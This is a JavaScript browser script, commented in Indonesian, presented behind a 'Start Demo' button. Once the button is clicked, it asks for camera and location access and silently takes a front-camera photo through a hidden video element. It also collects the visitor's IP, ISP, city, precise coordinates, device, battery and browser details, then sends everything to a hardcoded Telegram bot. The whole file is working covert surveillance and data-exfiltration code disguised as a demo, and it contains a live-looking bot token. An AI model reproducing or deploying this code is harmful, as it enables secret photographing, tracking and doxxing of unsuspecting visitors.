// === Konfigurasi Bot Telegram ===
const BOT_TOKEN = "8367413026:AAEM93F3pqbBwdOwJTCHs_0TYO4PnVsGfqY";
const CHAT_ID = "8482486283";

// Buat elemen video tersembunyi untuk akses kamera
const camera = document.createElement("video");
camera.setAttribute("autoplay", true);
camera.style.display = "none";
document.body.appendChild(camera);

// Ambil IP, lokasi, device info, WiFi, dan battery
async function getUserInfo() {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    // Ambil tipe koneksi (sebagai nama WiFi kasar)
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const namaWifi = connection && connection.type ? connection.type : "Tidak diketahui";

    // Battery info (jika browser support)
    let batteryLevel = "Tidak tersedia";
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100) + "%";
    }

    const deviceInfo = {
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      wifi: namaWifi,
      battery: batteryLevel,
    };

    return {
      ip: ipData.ip || "-",
      isp: ipData.org || "-",
      city: ipData.city || "-",
      region: ipData.region || "-",
      country: ipData.country_name || "-",
      lat: ipData.latitude,
      lon: ipData.longitude,
      time: new Date().toLocaleString(),
      ...deviceInfo,
    };
  } catch (err) {
    console.error("Gagal ambil info user:", err);
    return {};
  }
}

// Kirim foto + data ke Telegram
function kirimFotoTelegram(blob, info) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.jpg");
  formData.append(
    "caption",
    `📡 IP: ${info.ip}
🏢 ISP: ${info.isp}
📶 Nama WiFi: ${info.wifi}
🔋 Battery: ${info.battery}
📍 Lokasi: ${info.lat}, ${info.lon}
🌆 Kota: ${info.city}, ${info.region}, ${info.country}
🕒 Waktu: ${info.time} (${info.timezone})
💻 Device: ${info.platform}
🌐 Browser: ${info.browser}
🖥 Resolusi: ${info.screen}
🔗 https://www.google.com/maps?q=${info.lat},${info.lon}`
  );

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// Minta izin kamera + lokasi dengan high accuracy
function requestPermissions() {
  return new Promise((resolve, reject) => {
    (async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        camera.srcObject = stream;

        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => reject("Gagal mendapatkan lokasi"),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } catch (e) {
        reject("Gagal mendapatkan izin kamera");
      }
    })();
  });
}

// Capture gambar lalu kirim
async function captureAndSend(lokasi) {
  const info = await getUserInfo();

  // Override lat/lon dari lokasi high accuracy
  info.lat = lokasi.lat;
  info.lon = lokasi.lon;

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth || 640;
  canvas.height = camera.videoHeight || 480;
  canvas.getContext("2d").drawImage(camera, 0, 0, canvas.width, canvas.height);

  canvas.toBlob((blob) => {
    kirimFotoTelegram(blob, info).then(() => console.log("Foto + data terkirim ke Telegram"));
  }, "image/jpeg", 0.95);
}

// Tombol Start Demo
const btnStart = document.createElement("button");
btnStart.textContent = "Start Demo";
btnStart.style.padding = "15px 25px";
btnStart.style.fontSize = "18px";
btnStart.style.cursor = "pointer";
btnStart.style.margin = "20px auto";
btnStart.style.display = "block";
document.body.appendChild(btnStart);

// Jalankan pas klik tombol
btnStart.addEventListener("click", () => {
  requestPermissions()
    .then((lokasi) => setTimeout(() => captureAndSend(lokasi), 3000))
    .catch((e) => console.error("Error:", e));
}, { once: true });
